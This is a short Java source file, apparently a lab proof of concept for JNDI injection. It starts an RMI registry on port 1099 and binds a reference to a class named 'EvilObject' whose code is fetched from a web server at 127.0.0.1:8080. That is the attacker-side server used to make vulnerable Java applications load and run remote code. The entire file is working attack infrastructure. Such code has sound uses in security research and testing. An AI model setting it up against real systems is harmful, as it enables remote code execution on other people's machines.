package test;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIService {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference refObj = new Reference("EvilObject", "EvilObject", "http://127.0.0.1:8080/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'");
        registry.bind("refObj", refObjWrapper);
    }
}